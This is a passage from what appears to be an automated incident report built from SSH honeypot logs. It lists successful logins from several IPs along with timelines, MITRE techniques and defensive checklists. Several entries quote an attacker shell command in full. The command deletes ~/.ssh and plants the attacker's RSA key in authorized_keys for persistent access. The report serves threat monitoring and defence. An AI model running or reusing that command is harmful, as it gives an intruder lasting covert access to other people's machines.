| `2026-05-27 18:46:47` | `cowrie.command.input` |
| `2026-05-27 18:46:47` | `cowrie.command.failed` |
| `2026-05-27 18:46:47` | `cowrie.log.closed` |
| `2026-05-27 18:46:48` | `cowrie.session.params` |
| `2026-05-27 18:46:48` | `cowrie.command.input` |
| `2026-05-27 18:46:48` | `cowrie.session.file_download` |
| `2026-05-27 18:46:48` | `cowrie.log.closed` |
| `2026-05-27 18:46:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.147.19[.]238` to AbuseIPDB if not already reported
- [ ] Block `189.147.19[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a98df421b42

| Field | Detail |
|---|---|
| **Source IP** | `189.147.19[.]238` |
| **First Seen** | 2026-05-27 18:46 |
| **Last Seen** | 2026-05-27 18:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 18:46:51` | `cowrie.session.connect` |
| `2026-05-27 18:46:51` | `cowrie.client.version` |
| `2026-05-27 18:46:51` | `cowrie.client.kex` |
| `2026-05-27 18:46:53` | `cowrie.login.success` |
| `2026-05-27 18:46:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.147.19[.]238` to AbuseIPDB if not already reported
- [ ] Block `189.147.19[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23ac3cfb1108

| Field | Detail |
|---|---|
| **Source IP** | `101.36.109[.]176` |
| **First Seen** | 2026-05-27 18:47 |
| **Last Seen** | 2026-05-27 18:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 18:47:21` | `cowrie.session.connect` |
| `2026-05-27 18:47:21` | `cowrie.client.version` |
| `2026-05-27 18:47:21` | `cowrie.client.kex` |
| `2026-05-27 18:47:21` | `cowrie.login.success` |
| `2026-05-27 18:47:22` | `cowrie.session.params` |
| `2026-05-27 18:47:22` | `cowrie.command.input` |
| `2026-05-27 18:47:22` | `cowrie.command.failed` |
| `2026-05-27 18:47:22` | `cowrie.log.closed` |
| `2026-05-27 18:47:22` | `cowrie.session.params` |
| `2026-05-27 18:47:22` | `cowrie.command.input` |
| `2026-05-27 18:47:22` | `cowrie.session.file_download` |
| `2026-05-27 18:47:22` | `cowrie.log.closed` |
| `2026-05-27 18:47:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.109[.]176` to AbuseIPDB if not already reported
- [ ] Block `101.36.109[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bfce9a69e2a

| Field | Detail |
|---|---|
| **Source IP** | `101.36.109[.]176` |
| **First Seen** | 2026-05-27 18:47 |
| **Last Seen** | 2026-05-27 18:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 18:47:24` | `cowrie.session.connect` |
| `2026-05-27 18:47:24` | `cowrie.client.version` |
| `2026-05-27 18:47:24` | `cowrie.client.kex` |
| `2026-05-27 18:47:24` | `cowrie.login.success` |
| `2026-05-27 18:47:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.109[.]176` to AbuseIPDB if not already reported
- [ ] Block `101.36.109[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-596b9d1e98a3

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-27 18:55 |
| **Last Seen** | 2026-05-27 18:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 18:55:34` | `cowrie.session.connect` |
| `2026-05-27 18:55:34` | `cowrie.client.version` |
| `2026-05-27 18:55:35` | `cowrie.client.kex` |
| `2026-05-27 18:55:36` | `cowrie.login.success` |
| `2026-05-27 18:55:36` | `cowrie.session.params` |
| `2026-05-27 18:55:36` | `cowrie.command.input` |
| `2026-05-27 18:55:36` | `cowrie.command.failed` |
| `2026-05-27 18:55:37` | `cowrie.log.closed` |
| `2026-05-27 18:55:38` | `cowrie.session.params` |
| `2026-05-27 18:55:38` | `cowrie.command.input` |
| `2026-05-27 18:55:38` | `cowrie.session.file_download` |
| `2026-05-27 18:55:38` | `cowrie.log.closed` |
| `2026-05-27 18:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59dd794711e7

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-27 18:55 |
| **Last Seen** | 2026-05-27 18:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 18:55:41` | `cowrie.session.connect` |
| `2026-05-27 18:55:41` | `cowrie.client.version` |
| `2026-05-27 18:55:41` | `cowrie.client.kex` |
| `2026-05-27 18:55:42` | `cowrie.login.success` |
| `2026-05-27 18:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-866c002f5eee

| Field | Detail |
|---|---|
| **Source IP** | `27.128.171[.]39` |
| **First Seen** | 2026-05-27 18:56 |
| **Last Seen** | 2026-05-27 18:56 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 18:56:00` | `cowrie.session.connect` |
| `2026-05-27 18:56:00` | `cowrie.client.version` |
| `2026-05-27 18:56:00` | `cowrie.client.kex` |
| `2026-05-27 18:56:01` | `cowrie.login.success` |
| `2026-05-27 18:56:01` | `cowrie.session.params` |
| `2026-05-27 18:56:01` | `cowrie.command.input` |
| `2026-05-27 18:56:01` | `cowrie.command.failed` |
| `2026-05-27 18:56:01` | `cowrie.log.closed` |
| `2026-05-27 18:56:02` | `cowrie.session.params` |
| `2026-05-27 18:56:02` | `cowrie.command.input` |
| `2026-05-27 18:56:02` | `cowrie.session.file_download` |
| `2026-05-27 18:56:02` | `cowrie.log.closed` |
| `2026-05-27 18:56:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.171[.]39` to AbuseIPDB if not already reported
- [ ] Block `27.128.171[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-951e26f6d395

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-27 18:59 |
| **Last Seen** | 2026-05-27 18:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 18:59:07` | `cowrie.session.connect` |
| `2026-05-27 18:59:07` | `cowrie.client.version` |
| `2026-05-27 18:59:08` | `cowrie.client.kex` |
| `2026-05-27 18:59:09` | `cowrie.login.success` |
| `2026-05-27 18:59:09` | `cowrie.session.params` |
| `2026-05-27 18:59:09` | `cowrie.command.input` |
| `2026-05-27 18:59:09` | `cowrie.command.failed` |
| `2026-05-27 18:59:10` | `cowrie.log.closed` |
| `2026-05-27 18:59:10` | `cowrie.session.params` |
| `2026-05-27 18:59:10` | `cowrie.command.input` |
| `2026-05-27 18:59:10` | `cowrie.session.file_download` |
| `2026-05-27 18:59:10` | `cowrie.log.closed` |
| `2026-05-27 18:59:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-885d47f377e9

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-27 18:59 |
| **Last Seen** | 2026-05-27 18:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 18:59:13` | `cowrie.session.connect` |
| `2026-05-27 18:59:13` | `cowrie.client.version` |
| `2026-05-27 18:59:14` | `cowrie.client.kex` |
| `2026-05-27 18:59:15` | `cowrie.login.success` |
| `2026-05-27 18:59:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74bfdecee09d

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-27 19:02 |
| **Last Seen** | 2026-05-27 19:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 19:02:43` | `cowrie.session.connect` |
| `2026-05-27 19:02:44` | `cowrie.client.version` |
| `2026-05-27 19:02:44` | `cowrie.client.kex` |
| `2026-05-27 19:02:45` | `cowrie.login.success` |
| `2026-05-27 19:02:46` | `cowrie.session.params` |
| `2026-05-27 19:02:46` | `cowrie.command.input` |
| `2026-05-27 19:02:46` | `cowrie.command.failed` |
| `2026-05-27 19:02:46` | `cowrie.log.closed` |
| `2026-05-27 19:02:47` | `cowrie.session.params` |
| `2026-05-27 19:02:47` | `cowrie.command.input` |
| `2026-05-27 19:02:47` | `cowrie.session.file_download` |
| `2026-05-27 19:02:47` | `cowrie.log.closed` |
| `2026-05-27 19:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df6ea8944842

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-27 19:02 |
| **Last Seen** | 2026-05-27 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 19:02:50` | `cowrie.session.connect` |
| `2026-05-27 19:02:50` | `cowrie.client.version` |
| `2026-05-27 19:02:50` | `cowrie.client.kex` |
| `2026-05-27 19:02:51` | `cowrie.login.success` |
| `2026-05-27 19:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81d5bb7f65e4

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-27 19:04 |
| **Last Seen** | 2026-05-27 19:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 19:04:33` | `cowrie.session.connect` |
| `2026-05-27 19:04:33` | `cowrie.client.version` |
| `2026-05-27 19:04:33` | `cowrie.client.kex` |
| `2026-05-27 19:04:34` | `cowrie.login.success` |
| `2026-05-27 19:04:35` | `cowrie.session.params` |
| `2026-05-27 19:04:35` | `cowrie.command.input` |
| `2026-05-27 19:04:35` | `cowrie.command.failed` |
| `2026-05-27 19:04:36` | `cowrie.log.closed` |
| `2026-05-27 19:04:36` | `cowrie.session.params` |
| `2026-05-27 19:04:36` | `cowrie.command.input` |
| `2026-05-27 19:04:36` | `cowrie.session.file_download` |
| `2026-05-27 19:04:36` | `cowrie.log.closed` |
| `2026-05-27 19:04:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79c9b6116faa

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-27 19:04 |
| **Last Seen** | 2026-05-27 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 19:04:39` | `cowrie.session.connect` |
| `2026-05-27 19:04:39` | `cowrie.client.version` |
| `2026-05-27 19:04:40` | `cowrie.client.kex` |
| `2026-05-27 19:04:41` | `cowrie.login.success` |
| `2026-05-27 19:04:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b95f08dd1fa

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-27 19:06 |
| **Last Seen** | 2026-05-27 19:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 19:06:53` | `cowrie.session.connect` |
| `2026-05-27 19:06:53` | `cowrie.client.version` |
| `2026-05-27 19:06:53` | `cowrie.client.kex` |
| `2026-05-27 19:06:54` | `cowrie.login.success` |
| `2026-05-27 19:06:55` | `cowrie.session.params` |
| `2026-05-27 19:06:55` | `cowrie.command.input` |
| `2026-05-27 19:06:55` | `cowrie.command.failed` |
| `2026-05-27 19:06:55` | `cowrie.log.closed` |
| `2026-05-27 19:06:56` | `cowrie.session.params` |
| `2026-05-27 19:06:56` | `cowrie.command.input` |
| `2026-05-27 19:06:56` | `cowrie.session.file_download` |
| `2026-05-27 19:06:56` | `cowrie.log.closed` |
| `2026-05-27 19:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d1fae85fc6a

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-27 19:06 |
| **Last Seen** | 2026-05-27 19:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 19:06:59` | `cowrie.session.connect` |
| `2026-05-27 19:06:59` | `cowrie.client.version` |
| `2026-05-27 19:06:59` | `cowrie.client.kex` |
| `2026-05-27 19:07:00` | `cowrie.login.success` |
| `2026-05-27 19:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2946567157f2

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-27 19:08 |
| **Last Seen** | 2026-05-27 19:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 19:08:45` | `cowrie.session.connect` |
| `2026-05-27 19:08:45` | `cowrie.client.version` |
| `2026-05-27 19:08:45` | `cowrie.client.kex` |
| `2026-05-27 19:08:46` | `cowrie.login.success` |
| `2026-05-27 19:08:47` | `cowrie.session.params` |
| `2026-05-27 19:08:47` | `cowrie.command.input` |
| `2026-05-27 19:08:47` | `cowrie.command.failed` |
| `2026-05-27 19:08:48` | `cowrie.log.closed` |
| `2026-05-27 19:08:48` | `cowrie.session.params` |
| `2026-05-27 19:08:48` | `cowrie.command.input` |
| `2026-05-27 19:08:48` | `cowrie.session.file_download` |
| `2026-05-27 19:08:48` | `cowrie.log.closed` |
| `2026-05-27 19:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edc304beb3b7

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-27 19:08 |
| **Last Seen** | 2026-05-27 19:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 19:08:51` | `cowrie.session.connect` |
| `2026-05-27 19:08:51` | `cowrie.client.version` |
| `2026-05-27 19:08:51` | `cowrie.client.kex` |
| `2026-05-27 19:08:52` | `cowrie.login.success` |
| `2026-05-27 19:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.126.82[.]218` | **14** | 2026-05-27 17:24 | 2026-05-27 17:31 | 6m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.71.30[.]159` | **11** | 2026-05-27 18:46 | 2026-05-27 19:08 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.91[.]34` | **9** | 2026-05-27 18:28 | 2026-05-27 18:39 | 16m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.128.171[.]39` | **4** | 2026-05-27 18:47 | 2026-05-27 18:56 | 4m | 2 | `T1110.001 · T1592` | 🟢 LOW |
